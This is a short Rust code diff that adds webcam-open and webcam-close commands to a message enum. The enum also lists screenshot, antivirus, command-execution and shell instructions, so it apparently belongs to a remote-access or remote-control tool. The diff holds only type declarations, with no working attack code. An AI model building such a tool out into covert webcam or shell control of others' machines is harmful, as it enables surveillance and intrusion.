@@ -43,6 +43,10 @@ pub enum InstructMessage {
     Screenshot,
     AntiVirus,
 
+    // WebCam
+    WebCam(i32),
+    CloseWebCam,
+
     // Shell
     Exec(String),
     Shell,
